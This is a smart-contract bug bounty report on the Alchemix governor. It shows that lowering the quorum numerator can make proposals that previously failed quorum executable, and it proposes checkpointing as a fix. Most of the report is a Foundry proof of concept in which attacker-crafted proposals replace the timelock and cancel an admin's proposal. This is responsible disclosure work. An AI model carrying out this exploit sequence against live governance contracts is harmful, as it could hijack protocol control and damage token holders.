# 30781 - \[SC - Low] It is possible to lower the quorum requirements...

## It is possible to lower the quorum requirements that will lead to the past unmet proposals become executable

Submitted on May 5th 2024 at 20:55:25 UTC by @MTNether for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30781

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Protocol insolvency
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Permanent freezing of funds

### Description

### Brief/Intro

The lowering quorum poses a significant risk within governance systems, where reducing the quorum requirements could inadvertently render previously unmet proposals executable. This vulnerability arises when the quorum threshold is decreased below its initial value in the future, potentially allowing past proposals that failed to meet the original quorum to be executed. This could lead to unexpected changes in the system, bypassing intended checks and safeguards, and potentially disrupting the integrity of the governance process.

### Vulnerability Details

Alchemix utilizes the widely recognized OpenZeppelin governance system, facilitating proposal submission, voting, and execution upon meeting quorum requirements. This governance model, prevalent across various protocols, decentralizes decision-making, avoiding reliance on a single entity and promoting inclusivity. However, a potential pitfall of this model lies in its ability to modify the proposal acceptance quorum in the future. While not inherently a bug, this poses a challenge as it fails to record previous quorums, potentially allowing previously unmet proposals to be executed, circumventing established invariants and requirements.

The contract `L2GovernorVotesQuorumFraction` is responsible for keeping the aforementioned quorum. If we look at the contracts deeply, we can see there is not a snapshot or data keeping for these quorums. Also, the `quorumNumerator` can be updated in the future via the mentioned governance model:

```solidity
    function updateQuorumNumerator(uint256 newQuorumNumerator) external virtual onlyGovernance {
        _updateQuorumNumerator(newQuorumNumerator);
    }
```

This numerator determines the quorum threshold for proposal acceptance. However, if we reduce this numerator, initially set at 2000, below its current value, previously unmet proposals could potentially be executed. This would compromise past invariants and checks that remain valid.

This means that, If we change the acceptance quorum in the future, and we don't keep a record of the previous quorums, then the not-reaching previous proposals can be executed, bypassing the invariants and requirements.

I want to clarify that this attack differs from what is outlined on the Immunefi page:

> Ambiguous Proposal Executions via the TimelockController are acknowledged and a part of the governance management system.

And also:

> 5.34 Voting Power Threshold Updates

It is similar to this one but completely differs as it doesn't mention the impacts, doesn't share a runnable POC, and also doesn't discuss the ways which is possible.

### Impact Details

This complicated attack type may have several impacts on the system:

1. Transitioning the Timelock contract to one deployed by the attacker, giving them control over crucial functions and proposals.
2. Cancelling and quietly nullifying important and highly-supported proposals, undermining the governance process.
3. Triggering the execution of malicious and hazardous proposals, potentially causing severe harm to the system.

### References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/governance/L2GovernorVotesQuorumFraction.sol#L16>

## Recommended Mitigation Steps

Checkpointing the quorum is essential to prevent changes in the quorum from inadvertently transforming previously unsuccessful proposals into successful ones solely due to quorum adjustments.

Or you can update the contracts to match the OpenZeppelin contracts version 4.7.2 or higher. The governance contracts are currently derived from the version 4.5.0:

(<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/governance/L2GovernorVotesQuorumFraction.sol#L1-L4>):

```
// OpenZeppelin Contracts (last updated v4.5.0) (governance/extensions/GovernorVotesQuorumFraction.sol)
```

### Proof of Concept

You can add these tests to the file `AlchemixGovernor.t.sol` and run it:

```solidity

    function craftUpdateQuorumProposal()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {
        targets = new address[](1);
        targets[0] = address(governor);
        values = new uint256[](1);
        values[0] = 0; // Changing the quorum numerator which was set to 2000
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(governor.updateQuorumNumerator.selector, 500);
        description = "Updating the Quorum Numerator";
    }

    function craftCancellingProposal(
        address[] memory targets1,
        uint256[] memory values1,
        bytes[] memory calldatas1,
        string memory descriptionHash1,
        uint256 chainId
    )
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {
        targets = new address[](1);
        targets[0] = address(governor);
        values = new uint256[](1);
        values[0] = 0; // Changing the quorum numerator which was set to 2000
        calldatas = new bytes[](1);
        bytes32 descriptionHash = keccak256(bytes(descriptionHash1));
        calldatas[0] = abi.encodeWithSelector(governor.cancel.selector, targets1, values1, calldatas1, descriptionHash, chainId);
        description = "Cancelling the Proposal";
    }

    function craftChangeTimelockProposal()
        internal
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {

        address[] memory cancellerArray1 = new address[](1);
        cancellerArray1[0] = dead;
        address[] memory executorArray1 = new address[](1);
        executorArray1[0] = address(0);

        TimelockExecutor newTimelock = new TimelockExecutor(1 days, cancellerArray1, executorArray1);
        targets = new address[](1);
        targets[0] = address(governor);
        values = new uint256[](1);
        values[0] = 0; // Changing the quorum numerator which was set to 2000
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(governor.updateTimelock.selector, newTimelock);
        description = "Updating the Timelock contract";
    }

    function testAlteringTheQuorum() public {
        createVeAlcx(admin, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef, 5e22, MAXTIME, false);
        createVeAlcx(dead, 15_000e18, MAXTIME, false);

        hevm.warp(block.timestamp + 50);

        // The first proposal which couldn't be passed due to not reaching the quorum

        hevm.startPrank(dead);

        (address[] memory t1, uint256[] memory v1, bytes[] memory c1, string memory d1) = craftTestProposal();
        uint256 pid1 = governor.propose(t1, v1, c1, d1, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(dead);
        governor.castVote(pid1, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // execute
        hevm.startPrank(admin);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();

        // The second proposal which aims to change the acceptance quorum

        hevm.startPrank(beef);
        uint256 previousQuorum = governor.quorumNumerator();
        console2.log("Previous Quorum: ", previousQuorum);

        (address[] memory t2, uint256[] memory v2, bytes[] memory c2, string memory d2) = craftUpdateQuorumProposal();
        uint pid2 = governor.propose(t2, v2, c2, d2, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(beef);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.startPrank(dead);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period

        // execute
        hevm.startPrank(beef);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t2, v2, c2, keccak256(bytes(d2)), MAINNET);
        hevm.stopPrank();

        uint currentQuorum = governor.quorumNumerator();

        console2.log("Current Quorum: ", currentQuorum);

        // Finally, the first proposal which didn't executed at first, now it is executed successfully!

        hevm.startPrank(dead);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();
    }

    function testChangingTheTimelockContractAttack() public {
        createVeAlcx(admin, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef, 5e22, MAXTIME, false);
        createVeAlcx(dead, 15_000e18, MAXTIME, false);

        hevm.warp(block.timestamp + 50);
        console2.log("Previous Timelock: ", address(timelockExecutor));

        // The first proposal which aims to update the timelock contract
        // which couldn't be passed due to not reaching the quorum

        hevm.startPrank(dead);

        (address[] memory t1, uint256[] memory v1, bytes[] memory c1, string memory d1) = craftChangeTimelockProposal();
        uint256 pid1 = governor.propose(t1, v1, c1, d1, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(dead);
        governor.castVote(pid1, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // execute
        hevm.startPrank(admin);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();

        // The second proposal which aims to change the acceptance quorum

        hevm.startPrank(beef);
        uint256 previousQuorum = governor.quorumNumerator();
        console2.log("Previous Quorum: ", previousQuorum);

        (address[] memory t2, uint256[] memory v2, bytes[] memory c2, string memory d2) = craftUpdateQuorumProposal();
        uint pid2 = governor.propose(t2, v2, c2, d2, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(beef);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.startPrank(dead);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period

        // execution of the last proposal
        hevm.startPrank(beef);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t2, v2, c2, keccak256(bytes(d2)), MAINNET);
        hevm.stopPrank();

        uint currentQuorum = governor.quorumNumerator();
        console2.log("Current Quorum:  ", currentQuorum);

        // The attacker now executes the proposal
        hevm.startPrank(dead);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();

        console2.log("Current Timelock:  ", governor.timelock()); // The timelock contract updated
    }

    function testCancellingProposalsAttack() public {
        createVeAlcx(admin, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef, 5e22, MAXTIME, false);
        createVeAlcx(dead, 15_000e18, MAXTIME, false);

        hevm.warp(block.timestamp + 50);

        // The first proposal which is an important proposal which admin proposes

        hevm.startPrank(admin);
        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();
        uint256 pid = governor.propose(t, v, c, d, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(admin);
        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // The attacker proposes a proposal aiming to cancel the aforementioned proposal

        hevm.startPrank(dead);

        (address[] memory t1, uint256[] memory v1, bytes[] memory c1, string memory d1) = 
            craftCancellingProposal(t, v, c, d, MAINNET);
        uint256 pid1 = governor.propose(t1, v1, c1, d1, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(dead);
        governor.castVote(pid1, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.stopPrank();

        // execute
        hevm.startPrank(admin);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();

        // The last proposal which aims to change the acceptance quorum

        hevm.startPrank(beef);
        uint256 previousQuorum = governor.quorumNumerator();
        console2.log("Previous Quorum: ", previousQuorum);

        (address[] memory t2, uint256[] memory v2, bytes[] memory c2, string memory d2) = craftUpdateQuorumProposal();
        uint pid2 = governor.propose(t2, v2, c2, d2, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // voting delay
        hevm.roll(block.number + 1);
        hevm.stopPrank();

        // vote
        hevm.startPrank(beef);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.startPrank(dead);
        governor.castVote(pid2, 1);
        hevm.stopPrank();

        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period

        // execution of the last proposal
        hevm.startPrank(beef);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t2, v2, c2, keccak256(bytes(d2)), MAINNET);
        hevm.stopPrank();

        uint currentQuorum = governor.quorumNumerator();
        console2.log("Current Quorum:  ", currentQuorum);

        // execution of the attacker's proposal which cancels the admin's proposal
        hevm.startPrank(dead);
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        governor.execute(t1, v1, c1, keccak256(bytes(d1)), MAINNET);
        hevm.stopPrank();

        uint proposalStatus = uint(governor.state(pid));
        console2.log("Proposal Status is: ", proposalStatus); // The initial proposal is cancelled
    }
```
